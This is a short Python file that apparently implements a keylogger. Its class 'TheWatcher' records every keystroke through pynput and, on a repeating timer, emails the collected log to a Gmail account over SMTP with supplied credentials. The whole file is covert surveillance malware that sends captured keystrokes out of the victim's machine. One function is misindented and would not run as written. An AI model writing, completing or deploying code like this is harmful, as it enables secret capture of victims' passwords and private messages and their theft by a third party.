import pynput.keyboard as keyboard
import smtplib
import threading

class TheWatcher:
 def __init__(self, email_timer, email, passwd):
  self.log = ""
  self.email_T = email_timer
  self.email = email
  self.passwd = passwd

 def log_appender(self,string):
  self.log = self.log + string

# defining callback functions also special characters
 def callingBack(self, key):
  try:
   current_key = str(key.char)
  except AttributeError:
   if key == key.space:
    current_key = " "
   else:
    current_key = " " + str(key) + " "
  self.log_appender(current_key)

# setup Email Functionality 
 def send_email(self, email, passwd, msg):
  server = smtplib.SMTP("smtp.gmail.com", 587)
  server.starttls()
  server.login(email,passwd)
  server.sendmail(email,email,msg)
  server.quit()

# sending report to email 
 def report(self):
  self.send_email(self.email, self.passwd, self.log)
  self.log = ""
  start_Timer = threading.Timer(self.email_T, self.report)
  start_Timer.start()

# Starting listener
def startWatcher(self):
  key_Listener = keyboard.Listener(on_press=self.callingBack)
  with key_Listener:
   self.report()
   key_Listener.join()

#Later to implement
#Key.backspace  Key.space  Key.enter  Key.up  Key.down  Key.left  Key.right  Key.ctrl  Key.cmd  Key.alt NoneNone Key.shift  Key.caps_lock  Key.caps_lock  Key.tab  Key.ctrl 
